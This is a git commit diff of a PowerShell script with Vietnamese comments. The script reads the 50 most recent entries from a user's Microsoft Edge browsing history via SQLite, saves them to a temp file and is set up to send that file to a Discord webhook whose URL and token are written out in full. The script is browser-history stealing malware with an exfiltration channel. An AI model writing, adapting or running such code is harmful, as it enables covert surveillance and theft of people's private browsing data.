d4b0cf2fdd8c5e2be85c8152acf40329fb2b1534
khangpdm <phamdangminhkhang2005@gmail.com>
2026-03-05 21:36:55 +0700

    Update main.ps1

--- History/main.ps1
+++ History/main.ps1
@@ -1,5 +1,9 @@
+param(
+    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
+)
+
 # Webhook Discord của bạn
-$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"   # hoặc nguyên URL
+$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
 $whuri = "$dc"
 if ($whuri.Length -lt 120){
     $whuri = ("https://discord.com/api/webhooks/" + "$dc")
@@ -8,31 +12,14 @@ if ($whuri.Length -lt 120){
 # Đường dẫn file tạm để lưu kết quả
 $outpath = "$env:TEMP\edge_history.txt"
 
-# Đọc lịch sử Edge bằng SQLite
+# Đường dẫn file History của Edge
 $edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
 
-if (Test-Path $edgeHistory) {
-    Add-Type -AssemblyName System.Data
-    $cn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$edgeHistory;Version=3;")
-    $cn.Open()
-
-    $cmd = $cn.CreateCommand()
-    $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
-    $rdr = $cmd.ExecuteReader()
-
-    while ($rdr.Read()) {
-        $url   = $rdr['url']
-        $title = $rdr['title']
-        $count = $rdr['visit_count']
-        $time  = $rdr['last_visit_time']
-        $epoch = [DateTime]::FromFileTimeUtc(10*$time + 116444736000000000)
-
-        "$epoch | $count lần | $title | $url" | Out-File -FilePath $outpath -Append
-    }
-
-    $cn.Close()
+if (Test-Path $edgeHistory -and (Test-Path $sqlitePath)) {
+    # Query bằng sqlite3.exe, lấy 50 dòng gần nhất
+    & $sqlitePath $edgeHistory "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8
 } else {
-    "Không tìm thấy file lịch sử Edge." | Out-File -FilePath $outpath -Append
+    "Không tìm thấy file lịch sử Edge hoặc sqlite3.exe." | Out-File -FilePath $outpath -Encoding UTF8
 }
 
 # Gửi file lên Discord
